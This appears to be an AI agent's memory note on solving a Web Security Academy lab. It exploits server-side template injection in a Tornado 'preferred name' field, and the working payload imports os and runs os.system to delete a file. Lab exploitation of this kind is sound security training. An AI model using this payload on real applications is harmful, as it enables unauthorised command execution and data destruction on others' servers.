---
metadata:
  node_type: memory
name: "SSTI code-context Tornado lab solve arm A"
description: "Solved the code-context SSTI lab (Tornado) via the preferred-name field payload user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt'); banner congrats."
last_updated: 2026-10-10T06:16:36+08:00
created: 2026-10-10T06:16:36+08:00
---

## 2026-10-09 lab-server-side-template-injection-basic-code-context (arm A)

Target: /web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context, Tornado code context.

Chain (all HTTP via pieces, no browser):
1. page_read lab page -> widget lab_id 871A7E42...3DBA9; description = Tornado template, delete /home/carlos/morale.txt, creds wiener:peter.
2. range_launch launch-url <canonical path> --jar /tmp/cj1.json -> instance https://0a70002d0485b59683764673005400a7.web-security-academy.net/, reused:false.
3. http_session get /login --out -> csrf; http_session post /login (csrf, wiener, peter) -> 302 /my-account?id=wiener.
4. /my-account shows the injection point: form POST /my-account/change-blog-post-author-display, field blog-post-author-display (option values user.name / user.first_name / user.nickname) is template CODE, not a plain value.
5. Probe: display = user.name}}{{7*7}}, post a comment (POST /post/comment with csrf, postId, comment), reload /post?postId=1 -> comment author rendered Peter Wiener49}}.
   Mechanism: the server wraps the field as {{ <value> }}, so user.name}}{{7*7}} parses as {{user.name}}{{7*7}} plus a literal }}.
6. Exploit: display = user.name}}{%import os%}{{os.system('rm /home/carlos/morale.txt') (no trailing braces; the server's own }} closes the last expression).
   Reload the post page -> author rendered Peter Wiener0 (os.system exit status 0 printed = command ran, file deleted).
7. banner_verdict <base> --jar -> solved:true, "Congratulations, you solved the lab!".

Lessons:
- The preferred-name field is evaluated on every render of one's own comments, so an existing comment plus a page reload delivers the payload; no second comment needed.
- The rendered 0 right after the injected expression is the os.system exit status - a direct execution receipt independent of OOB.
- The /my-account csrf value stayed valid across the session for both the display change and the comment POST.

